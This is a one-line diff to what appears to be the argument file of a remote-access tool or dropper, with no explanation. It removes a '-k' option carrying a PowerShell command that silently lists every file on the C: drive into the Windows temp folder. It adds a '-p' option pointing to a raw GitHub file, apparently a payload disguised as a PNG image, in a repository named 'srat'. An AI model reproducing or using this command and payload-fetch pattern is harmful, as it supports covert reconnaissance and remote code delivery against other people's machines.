@@ -1,1 +1,1 @@
--kGet-ChildItem -Path C:\ -File -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName | Out-File -FilePath "C:\Windows\Temp" -Encoding UTF8
+-phttps://raw.githubusercontent.com/makarow2tech/srat/main/getfucked.png
